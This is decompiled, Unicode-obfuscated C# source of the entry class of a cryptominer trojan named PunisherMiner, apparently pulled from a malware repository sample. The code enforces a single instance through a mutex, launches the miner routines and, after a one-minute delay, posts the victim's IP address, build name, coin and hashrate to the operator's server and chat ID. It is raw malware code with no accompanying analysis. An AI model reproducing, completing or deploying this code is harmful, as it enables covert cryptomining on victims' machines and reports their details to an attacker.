// Decompiled with JetBrains decompiler
// Type: ‏​⁮‍‮⁯​⁭‫‭​‌‮‌‭⁭⁬⁯⁫‏⁭⁪⁪‬⁪⁫‍‫‍⁪‬‮‏⁮⁪‮⁮‎⁮‏‮
// Assembly: PunisherMiner, Version=3.0.2.4, Culture=neutral, PublicKeyToken=null
// MVID: 0E56BAA9-6097-4239-A28F-F65DA3522EC4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Miner.gen-1f563cbfc0379c29f15ea1e40466bd6b73233a51a720f3af9adb68f1828968c8.exe

using System;
using System.Collections.Specialized;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

internal class \u200F​⁮‍‮⁯​⁭‫‭​‌‮‌‭⁭⁬⁯⁫‏⁭⁪⁪‬⁪⁫‍‫‍⁪‬‮‏⁮⁪‮⁮‎⁮‏‮ : 
  \u200C⁯⁭⁮⁬‬‫‭‫⁪‮⁯⁪‎‌‌​‏⁬‎⁮‏⁭⁬‏⁭⁫⁬‮‏⁪⁬‏⁯‬‪⁯⁭⁪‬‮
{
  private static Mutex \u206A⁭⁪‎‏⁪‮⁬‌​⁪‌​‌‎‏⁫‎⁫⁬⁭⁫‮⁯‏⁯⁮‍‪⁫⁬‍⁪⁬‏‍‏⁮‌⁮‮;

  [DllImport("USER32.DLL", EntryPoint = "FindWindow", CharSet = CharSet.Unicode)]
  public static extern IntPtr \u202D‏​⁫‍‏‪⁯‎‎⁭‍⁯‪⁬⁯‍​‭‮‬⁮⁫‫‪⁪‏‬⁮‎⁮⁯⁪‮⁯⁪‍‍‬‭‮(
    string _param0,
    string _param1);

  private static void \u206D⁫⁮‎​‍⁯‏‮​‭⁬‪‌⁬‌⁫​​⁬⁫‫‭‫⁯⁭‭‌⁬‭⁯⁯‎‫⁪​‬⁫⁫⁭‮(string[] _param0)
  {
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
    if (!\u200F​⁮‍‮⁯​⁭‫‭​‌‮‌‭⁭⁬⁯⁫‏⁭⁪⁪‬⁪⁫‍‫‍⁪‬‮‏⁮⁪‮⁮‎⁮‏‮.\u200F⁪⁬‍⁬⁪‫⁭‍​​⁪‪‍‬⁫‎‎​‭‭‭‫‌‮‍⁬‎‭‪‎‏⁭‏‍‬‫‎⁯⁬‮())
      Environment.Exit(0);
    new Thread(new ThreadStart(\u200E⁫⁭⁭⁯‏‎‏⁪⁬⁫‍⁯‍‫‬⁮⁪⁮⁫⁪⁯⁮‭⁯⁬‎⁫‬‪‎‏‏‪⁯​⁪‮‭‬‮.\u200D⁫‭‬​⁭‫⁬‭‮⁯‬‏‌‫⁪⁪‍‮‬‮‌‏⁪‬‏⁯⁫⁭⁬​‫‫​‌‭⁮‪⁭‮)).Start();
    \u206A‫‫⁮⁫‭‏‮‭‍‭‏​‬⁮⁯‫⁯‭‍‮⁭⁯‍‫‮‮‪⁯⁪⁪‍‏‏‎‬‍⁭‌⁭‮ obj = new \u206A‫‫⁮⁫‭‏‮‭‍‭‏​‬⁮⁯‫⁯‭‍‮⁭⁯‍‫‮‮‪⁯⁪⁪‍‏‏‎‬‍⁭‌⁭‮();
    obj.\u202B⁪⁮​‮⁪‫‫‪‪‬‍​​⁪‎‍‏‬‬‍‌‍‮‭‭⁯⁬⁯‏​‪⁮‭⁯‪⁫⁯⁯‍‮();
    if (!\u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u206C‬‬‫⁭⁪​⁬‫‏⁬​‏⁯​​‫‫‌⁪‎⁭⁮‏‏⁬⁮‫⁪⁪‪⁯‭‎⁯‭⁭⁭⁪⁫‮)
      obj.\u202C⁫⁫⁫‍‎‭⁭⁭‮⁬⁮‮‏⁯‌⁭⁪‪‍⁬​‎‬⁪⁯‎‌⁭‍⁬‭⁫⁪⁯‏‎‫‎‏‮();
    if (\u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u200D‮‮⁫⁮‌‍⁫‭‍⁯⁪⁯‎⁯‬‏⁫‬‮‍⁫⁪‪⁬‌⁫‍‏⁬‭⁭‬‪‎‌⁯⁬⁮⁪‮)
      obj.\u206D​‮⁭‍⁪​‭‬‮‫⁮‮‫‏⁮‬‮‮‫⁭​‭‭‬​​‏⁫⁬‎‏‍‎⁭‭‫⁬⁭‮();
    \u202B‏⁭⁬⁪‍⁭⁫⁮⁫‌‍‭⁭⁭⁫⁯​⁭⁬‌⁫⁭⁮‬⁫⁬⁭‏‪‌⁯‫‪⁭‍⁫‪‪‭‮.\u202D‬‭‎‍‎‬‪⁯‪⁯​​‮‭⁬‫⁭‬‫‏‏‪‫​‎‪​‭​⁮‏‌​⁯‮⁫⁮‭‌‮();
    \u206D‍‪⁫⁫‫‬⁪⁪‭⁪⁬‎⁪⁬‪‎‌⁮‮⁮‭⁬‫‫‮⁫⁪‪‭⁮⁯‎⁫‎⁭⁪‎​⁯‮.\u206E‍‮⁭⁭‏⁮‮⁪⁪‮‍‌⁬‬⁫⁬‎​​‮‏‭‌‍⁭​⁭‏⁬‮‍‪‮‌‮⁪‌​‍‮(true);
    \u200F​⁮‍‮⁯​⁭‫‭​‌‮‌‭⁭⁬⁯⁫‏⁭⁪⁪‬⁪⁫‍‫‍⁪‬‮‏⁮⁪‮⁮‎⁮‏‮.\u206A‏‍‭⁫⁬‫⁫‭​⁭⁯⁫‍‌⁬‮‫‫​‬⁬‪⁭‍​‪‌‭‬‌⁭⁫‪‪⁯⁫‫‬‍‮().Wait();
  }

  private static Task<bool> \u206A‏‍‭⁫⁬‫⁫‭​⁭⁯⁫‍‌⁬‮‫‫​‬⁬‪⁭‍​‪‌‭‬‌⁭⁫‪‪⁯⁫‫‬‍‮()
  {
    Thread.Sleep(TimeSpan.FromSeconds(60.0));
    Console.WriteLine("Try send log to owner");
    try
    {
      using (WebClient webClient = new WebClient())
      {
        string str = \u200C⁯⁭⁮⁬‬‫‭‫⁪‮⁯⁪‎‌‌​‏⁬‎⁮‏⁭⁬‏⁭⁫⁬‮‏⁪⁬‏⁯‬‪⁯⁭⁪‬‮.\u202B‍‫​⁫⁮‍‮‭​⁬​‬⁯⁮‭‮‍‮‭‮‫‮​‎‍‪‫‮⁮‍‍‏‫⁫‪‫​‌‬‮();
        Encoding.UTF8.GetString(webClient.UploadValues(\u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u200B‭⁬‍‎⁬⁪​‏⁮​⁮‫‬‌⁪‬⁫‏⁭‍⁬‫‪⁪‭‫⁫⁮‪‫‫‬⁯‬‎‬⁫⁬‮, "POST", new NameValueCollection()
        {
          ["ip"] = str,
          ["message"] = string.Format("Билд: {0} \nКриптовалюта: {1}\nIP: {2}\nХешрейт на момент запуска: {3}", (object) \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u200D⁮‬‎‍‎⁯⁪​‍‌‍‌‌‬‬‫⁮‫‫‍⁪‭‏⁬‌⁫‮⁬⁮⁬⁮‫‏⁭‫⁭⁫⁭‎‮, (object) \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u200F‫⁭⁪‫‫⁪‭⁭⁫⁮​‬⁬​‪‍‮‍⁫‭‎​‫‍⁫‌‭⁯‍⁯‫‮⁭‪‪⁭⁪‭‭‮, (object) str, (object) \u200E⁯‭‌⁭‭‎⁪‮‌‎‌⁮‭‭‍‍‍⁯​‪‫⁮⁬‎‪‬‫​‎‎‍‏‪‏‫‍‭⁫‫‮.\u202D‬‪⁯‍‭⁫⁯‪‪‎⁫‭‮⁫‍⁭‌​​‏‫​‍⁫‎⁯⁮⁫‌‪‪‏⁮​⁭‪​⁮⁫‮()),
          ["chat"] = \u206B‌⁮‌‬‏⁬‏⁬‎​‮‬​‫‮‍‍‪⁮​‫‮‍⁯⁬‏‭‭‪⁫‎⁭​‌‌⁬‮‍‭‮.\u206E‌⁫⁬⁪‍‭⁫⁯‭​⁭‌⁮‏⁪‎‬‌‌‪‌⁪⁪⁬‌⁪‎⁮⁬‮‭⁫‎‬⁬⁯⁪⁫‬‮
        }));
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine("Eror log send: " + ex.Message);
    }
    return Task.FromResult<bool>(true);
  }

  private static bool \u200F⁪⁬‍⁬⁪‫⁭‍​​⁪‪‍‬⁫‎‎​‭‭‭‫‌‮‍⁬‎‭‪‎‏⁭‏‍‬‫‎⁯⁬‮()
  {
    bool createdNew;
    \u200F​⁮‍‮⁯​⁭‫‭​‌‮‌‭⁭⁬⁯⁫‏⁭⁪⁪‬⁪⁫‍‫‍⁪‬‮‏⁮⁪‮⁮‎⁮‏‮.\u206A⁭⁪‎‏⁪‮⁬‌​⁪‌​‌‎‏⁫‎⁫⁬⁭⁫‮⁯‏⁯⁮‍‪⁫⁬‍⁪⁬‏‍‏⁮‌⁮‮ = new Mutex(true, "SMILEFACE", out createdNew);
    return createdNew;
  }
}
